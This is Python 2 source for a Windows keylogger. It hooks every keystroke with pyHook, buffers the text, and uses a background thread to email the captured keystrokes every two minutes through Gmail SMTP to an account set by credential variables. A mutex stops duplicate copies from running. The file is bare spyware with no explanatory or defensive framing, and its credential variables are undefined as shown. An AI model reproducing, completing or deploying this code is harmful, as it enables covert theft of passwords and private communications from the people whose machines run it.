import pythoncom, pyHook
import os
import sys
import threading
import urllib,urllib2
import smtplib
import datetime,time
import win32event, win32api, winerror
from _winreg import *

mutex = win32event.CreateMutex(None, 1, 'N0tAs519n')
if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
    mutex = None
    print "..."
    exit(0)
x=''
data=''
count=0

class TimerClass(threading.Thread):
    def __init__(self):
        threading.Thread.__init__(self)
        self.event = threading.Event()
    def run(self):
        while not self.event.is_set():
            global data
            if len(data)>50:
                ts = datetime.datetime.now()
                SERVER = "smtp.gmail.com"
                PORT = 587
                USER = Eem4
                PASS = EPASS
                FROM = USER
                TO = [USER]
                SUBJECT = "B33: "+str(ts) 
                MESSAGE =  data 
                message = """\ 
From: %s
To: %s
Subject: %s

%s
""" % (FROM, ", ".join(TO), SUBJECT, MESSAGE)
                try:
                    server = smtplib.SMTP()
                    server.connect(SERVER,PORT)
                    server.starttls()
                    server.login(USER,PASS)
                    server.sendmail(FROM, TO, message)
                    data=''
                    server.quit()
                except Exception as e:
                    print e
            self.event.wait(120)

def main():
    global x
    em4=TimerClass()
    em4.start()
    return True

if __name__ == '__main__':
    main()

def pushing(event):
    global x,data
    if event.Ascii==13:
        e4Ch='<ENTER>'
    elif event.Ascii==8:
        e4Ch='<BACK SPACE>'
    elif event.Ascii==9:
        e4Ch='<TAB>'
    else:
        e4Ch=chr(event.Ascii)
    data=data+e4Ch 
    
obj = pyHook.HookManager()
obj.KeyDown = pushing
obj.HookKeyboard()
pythoncom.PumpMessages()

